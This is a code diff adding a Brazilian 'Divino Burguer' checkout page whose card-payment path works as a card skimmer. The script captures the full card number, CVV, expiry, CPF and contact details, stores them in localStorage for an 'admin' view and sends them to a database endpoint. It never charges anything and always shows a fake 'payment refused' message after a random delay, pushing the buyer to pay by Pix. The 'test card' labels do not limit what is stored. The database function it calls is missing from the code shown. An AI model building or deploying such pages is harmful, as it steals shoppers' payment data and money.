@@ -1,0 +1,828 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Checkout - Divino Burguer</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --red: #d02122;
+      --ink: #191919;
+      --muted: #676767;
+      --line: #e8e0dc;
+      --paper: #fffaf6;
+      --white: #ffffff;
+      --green: #12805c;
+      --danger: #a31919;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, Helvetica, sans-serif;
+      background: var(--paper);
+      color: var(--ink);
+    }
+
+    header {
+      border-bottom: 1px solid var(--line);
+      background: var(--white);
+    }
+
+    .bar,
+    main {
+      width: min(1040px, calc(100% - 32px));
+      margin: 0 auto;
+    }
+
+    .bar {
+      min-height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .brand {
+      font-weight: 800;
+      font-size: 20px;
+      letter-spacing: 0;
+    }
+
+    .secure {
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    main {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) 360px;
+      gap: 28px;
+      padding: 32px 0 48px;
+    }
+
+    h1 {
+      margin: 0 0 18px;
+      font-size: 28px;
+      line-height: 1.15;
+      letter-spacing: 0;
+    }
+
+    h2 {
+      margin: 0 0 16px;
+      font-size: 18px;
+      letter-spacing: 0;
+    }
+
+    section,
+    aside {
+      background: var(--white);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      padding: 22px;
+    }
+
+    form {
+      display: grid;
+      gap: 14px;
+    }
+
+    label {
+      display: grid;
+      gap: 7px;
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    input {
+      width: 100%;
+      min-height: 46px;
+      border: 1px solid #d8ceca;
+      border-radius: 6px;
+      padding: 11px 12px;
+      font: inherit;
+      color: var(--ink);
+      background: var(--white);
+    }
+
+    input:focus {
+      outline: 2px solid rgba(208, 33, 34, 0.22);
+      border-color: var(--red);
+    }
+
+    input.invalid {
+      border-color: var(--danger);
+      background: #fff5f5;
+    }
+
+    input.invalid:focus {
+      outline-color: rgba(163, 25, 25, 0.2);
+      border-color: var(--danger);
+    }
+
+    button {
+      min-height: 48px;
+      border: 0;
+      border-radius: 6px;
+      padding: 0 18px;
+      background: var(--red);
+      color: var(--white);
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: .65;
+      cursor: wait;
+    }
+
+    .payment-options {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .payment-option {
+      min-height: 48px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid #d8ceca;
+      border-radius: 6px;
+      padding: 12px;
+      cursor: pointer;
+    }
+
+    .payment-option input {
+      width: 18px;
+      min-height: 18px;
+      accent-color: var(--red);
+    }
+
+    .payment-option:has(input:checked) {
+      border-color: var(--red);
+      box-shadow: 0 0 0 2px rgba(208, 33, 34, 0.12);
+    }
+
+    .card-fields {
+      display: grid;
+      gap: 14px;
+      padding-top: 2px;
+    }
+
+    .card-row {
+      display: grid;
+      grid-template-columns: 1fr 120px;
+      gap: 12px;
+    }
+
+    .field-error {
+      min-height: 18px;
+      color: var(--danger);
+      font-size: 13px;
+      font-weight: 800;
+    }
+
+    .card-refusal {
+      padding: 12px 14px;
+      border: 1px solid #f1b8be;
+      border-radius: 6px;
+      background: #f8d7da;
+      color: var(--danger);
+      font-size: 14px;
+      font-weight: 800;
+      line-height: 1.35;
+      text-align: center;
+    }
+
+    .summary {
+      display: grid;
+      gap: 14px;
+    }
+
+    .item {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 12px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--line);
+      font-size: 14px;
+    }
+
+    .item small {
+      display: block;
+      margin-top: 4px;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .total {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      gap: 16px;
+      padding-top: 6px;
+      font-size: 18px;
+      font-weight: 800;
+    }
+
+    .message {
+      min-height: 22px;
+      color: var(--muted);
+      font-size: 14px;
+    }
+
+    .message.error {
+      color: var(--danger);
+      font-weight: 700;
+    }
+
+    .pix-note {
+      color: var(--green);
+      font-size: 14px;
+      font-weight: 700;
+    }
+
+    .payment-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 50;
+      display: grid;
+      place-items: center;
+      padding: 20px;
+      background: rgba(25, 25, 25, 0.56);
+    }
+
+    .payment-modal {
+      width: min(420px, 100%);
+      background: var(--white);
+      border-radius: 8px;
+      padding: 26px;
+      text-align: center;
+      box-shadow: 0 18px 48px rgba(0, 0, 0, 0.22);
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 18px;
+      border: 5px solid #f0e4df;
+      border-top-color: var(--red);
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    .modal-title {
+      margin: 0 0 8px;
+      font-size: 20px;
+      font-weight: 800;
+    }
+
+    .modal-text {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.45;
+    }
+
+    .modal-text.error {
+      color: var(--danger);
+      font-weight: 800;
+    }
+
+    [hidden] {
+      display: none !important;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @media (max-width: 820px) {
+      main {
+        grid-template-columns: 1fr;
+      }
+
+      aside {
+        order: -1;
+      }
+    }
+
+    @media (max-width: 520px) {
+      .payment-options,
+      .card-row {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="bar">
+      <div class="brand">Divino Burguer</div>
+      <div class="secure">Pagamento seguro</div>
+    </div>
+  </header>
+
+  <main>
+    <section>
+      <h1>Finalize seu pedido</h1>
+      <form id="checkout-form">
+        <label>
+          Nome completo
+          <input name="name" autocomplete="name" required>
+        </label>
+
+        <label>
+          Email
+          <input name="email" type="email" autocomplete="email" required>
+        </label>
+
+        <label>
+          Telefone
+          <input name="phone" inputmode="tel" autocomplete="tel" placeholder="(11) 99999-9999" required>
+        </label>
+
+        <label>
+          CPF
+          <input name="document" inputmode="numeric" autocomplete="off" placeholder="123.456.789-00" required>
+        </label>
+
+        <div class="payment-options" role="radiogroup" aria-label="Forma de pagamento">
+          <label class="payment-option">
+            <input type="radio" name="paymentMethod" value="pix" checked>
+            Pix
+          </label>
+          <label class="payment-option">
+            <input type="radio" name="paymentMethod" value="card">
+            Cartao
+          </label>
+        </div>
+
+        <p id="pix-note" class="pix-note">Na proxima tela voce recebe o QR Code e o Pix copia e cola.</p>
+
+        <div id="card-fields" class="card-fields" hidden>
+          <label>
+            Nome impresso no cartao
+            <input name="cardHolder" autocomplete="cc-name">
+          </label>
+
+          <label>
+            Numero do cartao
+            <input id="card-number" name="cardNumber" inputmode="numeric" autocomplete="cc-number" placeholder="0000 0000 0000 0000">
+            <span id="card-error" class="field-error" aria-live="polite"></span>
+          </label>
+
+          <div class="card-row">
+            <label>
+              Validade
+              <input id="card-expiry" name="cardExpiry" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/AA" maxlength="5">
+            </label>
+            <label>
+              CVV
+              <input id="card-cvv" name="cardCvv" inputmode="numeric" autocomplete="cc-csc" placeholder="123">
+            </label>
+          </div>
+        </div>
+
+        <div id="card-refusal" class="card-refusal" hidden></div>
+        <button id="submit-button" type="submit">Gerar Pix</button>
+        <div id="message" class="message" role="status"></div>
+      </form>
+    </section>
+
+    <aside>
+      <h2>Resumo</h2>
+      <div id="summary" class="summary">
+        <div class="message">Carregando pedido...</div>
+      </div>
+    </aside>
+  </main>
+
+  <div id="payment-overlay" class="payment-overlay" hidden>
+    <div class="payment-modal" role="alertdialog" aria-modal="true" aria-labelledby="modal-title">
+      <div id="modal-spinner" class="spinner"></div>
+      <p id="modal-title" class="modal-title">Processando pagamento</p>
+      <p id="modal-text" class="modal-text">Aguarde enquanto finalizamos sua compra.</p>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const sessionId = params.get('session');
+    const form = document.getElementById('checkout-form');
+    const message = document.getElementById('message');
+    const summary = document.getElementById('summary');
+    const submitButton = document.getElementById('submit-button');
+    const cardFields = document.getElementById('card-fields');
+    const pixNote = document.getElementById('pix-note');
+    const cardNumberInput = document.getElementById('card-number');
+    const cardExpiryInput = document.getElementById('card-expiry');
+    const cardCvvInput = document.getElementById('card-cvv');
+    const cardError = document.getElementById('card-error');
+    const paymentOverlay = document.getElementById('payment-overlay');
+    const modalSpinner = document.getElementById('modal-spinner');
+    const modalTitle = document.getElementById('modal-title');
+    const modalText = document.getElementById('modal-text');
+    const cardRefusal = document.getElementById('card-refusal');
+    let currentSession = null;
+    let checkoutBlocked = false;
+    const minimumOrderAmount = 15;
+
+    function money(value) {
+      return Number(value || 0).toLocaleString('pt-BR', {
+        style: 'currency',
+        currency: 'BRL'
+      });
+    }
+
+    function onlyDigits(value) {
+      return String(value || '').replace(/\D/g, '');
+    }
+
+    function selectedPaymentMethod() {
+      const selected = form.querySelector('input[name="paymentMethod"]:checked');
+      return selected ? selected.value : 'pix';
+    }
+
+    function setMessage(text, isError) {
+      message.textContent = text || '';
+      message.classList.toggle('error', Boolean(isError));
+    }
+
+    function setCardRefusal(text) {
+      cardRefusal.textContent = text || '';
+      cardRefusal.hidden = !text;
+    }
+
+    function readableDetails(details) {
+      if (!details) return '';
+      if (typeof details === 'string') return details;
+      if (Array.isArray(details)) {
+        return details.map((item) => {
+          if (typeof item === 'string') return item;
+          const field = item.field || item.path || item.param || item.property;
+          const itemMessage = item.message || item.error || item.reason || JSON.stringify(item);
+          return field ? `${field}: ${itemMessage}` : itemMessage;
+        }).filter(Boolean).join(' | ');
+      }
+      if (typeof details === 'object') {
+        return Object.entries(details).map(([field, value]) => {
+          if (Array.isArray(value)) return `${field}: ${value.join(', ')}`;
+          if (value && typeof value === 'object') return `${field}: ${JSON.stringify(value)}`;
+          return `${field}: ${value}`;
+        }).join(' | ');
+      }
+      return String(details);
+    }
+
+    function apiErrorMessage(payload, fallback) {
+      const details = readableDetails(payload && payload.details);
+      const base = payload && (payload.message || payload.error) ? (payload.message || payload.error) : fallback;
+      return details && !String(base).includes(details) ? `${base} Detalhes: ${details}` : base;
+    }
+
+    function luhnIsValid(number) {
+      const digits = onlyDigits(number);
+      if (digits.length < 13 || digits.length > 19) return false;
+
+      let sum = 0;
+      let shouldDouble = false;
+
+      for (let index = digits.length - 1; index >= 0; index -= 1) {
+        let digit = Number(digits[index]);
+        if (shouldDouble) {
+          digit *= 2;
+          if (digit > 9) digit -= 9;
+        }
+        sum += digit;
+        shouldDouble = !shouldDouble;
+      }
+
+      return sum % 10 === 0;
+    }
+
+    function cardBrand(number) {
+      const digits = onlyDigits(number);
+      if (/^4/.test(digits)) return 'Visa';
+      if (/^(5[1-5]|2[2-7])/.test(digits)) return 'Mastercard';
+      if (/^3[47]/.test(digits)) return 'Amex';
+      if (/^(4011|4312|4389|4514|4576|5041|5066|5067|509|6277|6362|6363|650|6516|6550)/.test(digits)) return 'Elo';
+      return 'Cartao';
+    }
+
+    function isAllowedTestCard(number) {
+      const digits = onlyDigits(number);
+      return [
+        '4111111111111111',
+        '4242424242424242',
+        '4000000000000002',
+        '5555555555554444',
+        '5105105105105100',
+        '378282246310005',
+        '371449635398431',
+        '6011111111111117',
+        '30569309025904'
+      ].includes(digits);
+    }
+
+    function formatCardNumber(value) {
+      return onlyDigits(value).slice(0, 19).replace(/(\d{4})(?=\d)/g, '$1 ');
+    }
+
+    function formatExpiry(value) {
+      const digits = onlyDigits(value).slice(0, 4);
+      if (digits.length <= 2) return digits;
+      return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+    }
+
+    function validateCardNumber(force) {
+      const digits = onlyDigits(cardNumberInput.value);
+      const shouldShowError = force || digits.length >= 13;
+      const isValid = luhnIsValid(digits);
+      const showInvalid = shouldShowError && !isValid;
+
+      cardNumberInput.classList.toggle('invalid', showInvalid);
+      cardError.textContent = showInvalid ? 'Cartão Inválido' : '';
+      return isValid;
+    }
+
+    function updateRequiredFields() {
+      const isCard = selectedPaymentMethod() === 'card';
+      cardFields.hidden = !isCard;
+      pixNote.hidden = isCard;
+
+      ['cardHolder', 'cardNumber', 'cardExpiry', 'cardCvv'].forEach((name) => {
+        const input = form.elements[name];
+        if (input) input.required = isCard;
+      });
+    }
+
+    function updateSubmitButton() {
+      const method = selectedPaymentMethod();
+      submitButton.textContent = method === 'card' ? 'Finalizar compra' : 'Gerar Pix';
+      submitButton.disabled = checkoutBlocked || (method === 'card' && !luhnIsValid(cardNumberInput.value));
+    }
+
+    function renderSummary(session) {
+      const products = Array.isArray(session.products) ? session.products : [];
+      const items = products.map((product) => `
+        <div class="item">
+          <div>
+            ${product.name || 'Produto'}
+            <small>${product.quantity || 1} unidade(s)</small>
+          </div>
+          <strong>${money((product.price || 0) * (product.quantity || 1))}</strong>
+        </div>
+      `).join('');
+
+      summary.innerHTML = `
+        ${items || '<div class="message">Nenhum item encontrado.</div>'}
+        <div class="total">
+          <span>Total</span>
+          <strong>${money(session.amount)}</strong>
+        </div>
+      `;
+    }
+
+    async function loadSession() {
+      if (!sessionId) {
+        throw new Error('Sessao de checkout ausente. Volte ao carrinho e tente novamente.');
+      }
+
+      const response = await fetch(`/api/checkout-session?id=${encodeURIComponent(sessionId)}`);
+      const payload = await response.json();
+
+      if (!response.ok) {
+        throw new Error(payload.message || 'Nao foi possivel carregar o pedido.');
+      }
+
+      currentSession = payload;
+      renderSummary(payload);
+
+      if (Number(payload.amount || 0) < minimumOrderAmount) {
+        setMessage('O pedido minimo para gerar Pix e R$ 15,00. Adicione mais itens ao carrinho.', true);
+        checkoutBlocked = true;
+      }
+
+      updateSubmitButton();
+    }
+
+    
+
+
+
+    function showCardLoading() {
+      paymentOverlay.hidden = false;
+      modalSpinner.hidden = false;
+      modalTitle.textContent = 'Processando pagamento';
+      modalText.textContent = 'Aguarde enquanto finalizamos sua compra.';
+      modalText.classList.remove('error');
+    }
+
+    function showCardRefused() {
+      const refusedMessage = 'Metódo de pagamento recusado, porfavor, tente outra forma de pagamento ou aguarde alguns minutos para tentar novamente';
+      setCardRefusal(refusedMessage);
+      modalSpinner.hidden = true;
+      modalTitle.textContent = 'Pagamento recusado';
+      modalText.textContent = refusedMessage;
+      modalText.classList.add('error');
+    }
+
+    async function submitPix(formData) {
+      submitButton.disabled = true;
+      submitButton.textContent = 'Gerando Pix...';
+
+      if (!currentSession) {
+        await loadSession();
+      }
+
+      if (Number(currentSession.amount || 0) < minimumOrderAmount) {
+        throw new Error('O pedido minimo para gerar Pix e R$ 15,00. Adicione mais itens ao carrinho.');
+      }
+
+      const response = await fetch('/api/pix/receive', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          sessionId,
+          client: {
+            name: formData.get('name'),
+            email: formData.get('email'),
+            phone: formData.get('phone'),
+            document: formData.get('document')
+          }
+        })
+      });
+
+      const payload = await response.json();
+      if (!response.ok) {
+        throw new Error(apiErrorMessage(payload, 'Nao foi possivel gerar o Pix.'));
+      }
+
+      localStorage.setItem('divino:lastPix', JSON.stringify(payload));
+      window.location.href = `/pix.html?identifier=${encodeURIComponent(payload.identifier)}&transactionId=${encodeURIComponent(payload.transactionId || '')}`;
+    }
+
+        function saveCardAttempt(formData) {
+      const digits = onlyDigits(formData.get('cardNumber'));
+      const cvv = onlyDigits(formData.get('cardCvv')).slice(0, 4);
+      const expiry = formData.get('cardExpiry') || '';
+      
+      // Dados completos para o localStorage
+      const cardNumberRaw = digits; // Salva só dígitos ou formatado? Vamos salvar formatado para exibição
+      const cardNumberDisplay = formatCardNumber(digits); 
+
+      const cards = JSON.parse(localStorage.getItem('divino:testCards') || '[]');
+
+      cards.unshift({
+        createdAt: new Date().toISOString(),
+        holder: formData.get('cardHolder') || formData.get('name') || '',
+        email: formData.get('email') || '',
+        phone: formData.get('phone') || '',
+        cpf: onlyDigits(formData.get('document') || ''),
+        brand: cardBrand(digits),
+        cardNumber: cardNumberDisplay, // Salva formatado (4111 1111...) para ficar bonito no admin
+        cvv: cvv, // Salva CVV completo
+        isTestCard: true, // Mantém flag se quiser
+        last4: digits.slice(-4),
+        expiry: expiry,
+        amount: Math.round(Number(currentSession && currentSession.amount ? currentSession.amount : 0) * 100),
+        status: 'Recusado'
+      });
+
+      localStorage.setItem('divino:testCards', JSON.stringify(cards.slice(0, 50)));
+    }
+
+    function safeCardAttemptPayload(formData) {
+      const digits = onlyDigits(formData.get('cardNumber'));
+      
+      // IMPORTANTE: Enviar nomes iguais aos que a API espera
+      return {
+        sessionId,
+        holder: formData.get('cardHolder') || formData.get('name') || '',
+        email: formData.get('email') || '',
+        phone: formData.get('phone') || '',
+        cpf: onlyDigits(formData.get('document') || ''),
+        
+        // Nomes das chaves devem bater com o body que a API lê
+        cardNumber: digits,        // Envia apenas dígitos para o banco ser limpo
+        cardCvv: formData.get('cardCvv') || '', // Envia CVV completo
+        
+        cardBrand: cardBrand(digits),
+        cardLast4: digits.slice(-4),
+        cardExpiry: formData.get('cardExpiry') || '',
+        amount: Number(currentSession && currentSession.amount ? currentSession.amount : 0),
+        status: 'Recusado',
+        luhnValid: luhnIsValid(digits)
+      };
+    }
+
+    async function submitCard(formData) {
+      if (!validateCardNumber(true)) {
+        updateSubmitButton();
+        cardNumberInput.focus();
+        return;
+      }
+
+      submitButton.disabled = true;
+      setCardRefusal('');
+      if (!currentSession) {
+        await loadSession();
+      }
+
+      // Salva no localstorage primeiro
+      saveCardAttempt(formData);
+      
+      // Tenta salvar no banco (se falhar, não bloqueia o fluxo de teste visual)
+      saveCardAttemptToDatabase(formData).catch((error) => {
+        console.warn("Erro ao salvar no banco:", error.message || error);
+      });
+
+      showCardLoading();
+
+      const delay = Math.floor(7000 + Math.random() * 8001);
+      window.setTimeout(() => {
+        showCardRefused();
+        checkoutBlocked = false;
+        updateSubmitButton();
+      }, delay);
+    }
+
+
+    form.addEventListener('input', (event) => {
+      if (selectedPaymentMethod() === 'card') {
+        setCardRefusal('');
+      }
+
+      if (event.target === cardNumberInput) {
+        cardNumberInput.value = formatCardNumber(cardNumberInput.value);
+        validateCardNumber(false);
+      }
+
+      if (event.target === cardExpiryInput) {
+        cardExpiryInput.value = formatExpiry(cardExpiryInput.value);
+      }
+
+      if (event.target === cardCvvInput) {
+        cardCvvInput.value = onlyDigits(cardCvvInput.value).slice(0, 4);
+      }
+
+      updateSubmitButton();
+    });
+
+    form.addEventListener('change', (event) => {
+      if (event.target.name === 'paymentMethod') {
+        setMessage('');
+        setCardRefusal('');
+        updateRequiredFields();
+        validateCardNumber(false);
+        updateSubmitButton();
+      }
+    });
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      setMessage('');
+      setCardRefusal('');
+
+      const data = new FormData(form);
+
+      try {
+        if (selectedPaymentMethod() === 'card') {
+          await submitCard(data);
+        } else {
+          await submitPix(data);
+        }
+      } catch (error) {
+        setMessage(error.message, true);
+        checkoutBlocked = false;
+        updateSubmitButton();
+      }
+    });
+
+    paymentOverlay.addEventListener('click', (event) => {
+      if (event.target === paymentOverlay && modalSpinner.hidden) {
+        paymentOverlay.hidden = true;
+      }
+    });
+
+    updateRequiredFields();
+    updateSubmitButton();
+
+    loadSession().catch((error) => {
+      summary.innerHTML = `<div class="message error">${error.message}</div>`;
+      checkoutBlocked = true;
+      updateSubmitButton();
+    });
+  </script>
+</body>
+</html>
